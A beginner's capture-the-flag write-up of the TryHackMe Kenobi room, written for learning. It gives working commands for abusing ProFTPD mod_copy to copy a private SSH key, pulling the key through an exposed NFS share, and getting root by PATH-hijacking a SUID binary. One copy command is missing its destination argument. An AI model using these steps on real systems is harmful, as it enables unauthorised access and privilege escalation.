# TryHackMe – Kenobi Write-Up

## Scope

Target machine: 10.65.133.246  
Operating System: Linux (Ubuntu 20.04)  
Objective: Gain user and root access  
Methodology: Blackbox enumeration and exploitation using common pentesting tools (Blackbox because i tried to solve on my own without the guidance of THM in the room)

The assessment was performed from a Kali Linux attack machine within the TryHackMe network.

---

## Initial Enumeration

A full TCP scan was performed:
nmap -sC -sV -p- -T4 -oN kenobi_full_tcp.txt 10.65.133.246

Open ports identified:

- 21/tcp – FTP (ProFTPD 1.3.5)
- 22/tcp – SSH
- 80/tcp – HTTP (Apache)
- 111/tcp – rpcbind
- 139/tcp – SMB
- 445/tcp – SMB
- 2049/tcp – NFS

The system exposed multiple file-related services (SMB, NFS, FTP), indicating potential misconfiguration-based attack paths.

---

## SMB Enumeration
(personal note: did not encounter SMB before, as THM Cybersecurity 101 did not teach this. So thanks to THM room guidance and ChatGPT, which i used to get a grip on SMB)

Shares were enumerated using:
smbclient -L //10.65.133.246 -N

Discovered shares:

- print$
- anonymous
- IPC$

The `anonymous` share allowed unauthenticated access.

Connecting to the share:
smbclient //10.65.133.246/anonymous
ls

A `log.txt` file was discovered and downloaded:
get log.txt (Note: THM recommends another command with recursive copying. As it's just one file, I did not see the point)


The log revealed:
- A user named `kenobi`
- Information about SSH key generation (see at the end "importance of knowledge where keys are stored")
- ProFTPD in use

---

## FTP Enumeration and Exploitation (mod_copy)

FTP banner grabbing confirmed the service version:

nc 10.65.133.246 21
Response:
220 ProFTPD 1.3.5 Server

Vulnerability research:
searchsploit proftpd 1.3.5

Identified: `mod_copy` Remote Command Execution.

Testing whether `mod_copy` was enabled:
nc 10.65.133.246 21
SITE CPFR /etc/passwd

Successful response confirmed the module was active.

The private SSH key was copied server-side:

SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

## NFS Enumeration and Key Extraction

NFS exports were identified using:
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.65.133.246
Discovered export:
/var

Mounted locally:
mkdir /tmp/kenobi_nfs
sudo mount -t nfs 10.65.133.246:/var /tmp/kenobi_nfs

The copied SSH key was retrieved:
cp /tmp/kenobi_nfs/tmp/id_rsa
chmod 600 id_rsa

## Initial Access via SSH

Authenticated as user `kenobi`:
ssh -i id_rsa kenobi@10.65.133.246
User flag in: /home/kenobi/user.txt


---

## Privilege Escalation

SUID binaries were enumerated:
find / -perm -4000 -type f 2>/dev/null
/usr/bin/menu
(personal note: I don't have enough experience, so notice odd entries right away. So i asked ChatGPT for help)

Permissions:

-rwsr-xr-x 1 root root ...
(so it runs as root)

The binary was analyzed:

file /usr/bin/menu
strings /usr/bin/menu

Strings output revealed usage of:

- system()
- curl (without absolute path, so we can use that (hijack that) to execute a shell named path, because usr/bin/menu will execute the first curl in PATH as it's default behaviour)

The binary executed commands such as:
curl -I localhost

Because no absolute path was specified, the program relied on the PATH environment variable.

## PATH Hijacking Exploit

A malicious replacement for `curl` was created:

cd /tmp (note: in /tmp because every user can write here)
echo '/bin/bash' > curl
chmod +x curl


The PATH variable was modified:
export PATH=/tmp:$PATH (personal note: i would note have been able to to this with only THM Cybersecurity 101 knowledge or would have come  up with the attack myself, credits go to ChatGPT, I can live with not knowing everything as a beginner)

Executing the vulnerable SUID binary:
/usr/bin/menu
Selecting option 1 triggered execution of `curl`, which resolved to `/tmp/curl`.

This resulted in a root shell:

whoami
root

Root flag located in:
/root/root.txt

## Attack Chain Summary
(just for my personal repetition)

1. SMB anonymous share exposed sensitive log file
2. Log revealed user information and service details
3. ProFTPD mod_copy used to copy private SSH key
4. NFS export used to retrieve key
5. SSH login as kenobi
6. SUID binary vulnerable to PATH hijacking
7. Root access achieved

---

## Lessons Learned

- Enumeration across multiple services is critical (I did not know NFS as I never encountered it before)
- ProFTPD mod_copy allows file copy without authentication when enabled.
- Seeing a created public key means there is (obviously) a private key somewhere.
- Knowing where linux stores keys is essential.
- NFS read-only access can still be dangerous when combined with another primitive.
- SUID binaries must use absolute paths when invoking external commands. Otherwise vulnerable to path hijacking (which is kind of cool)
- PATH manipulation is a powerful and realistic privilege escalation vector.

---

## Conclusion

The Kenobi room demonstrates a multi-stage exploitation chain combining service misconfiguration, credential exposure, and insecure local privilege escalation.

The compromise relied on insecure service configuration and unsafe programming practices (path-hijacking).




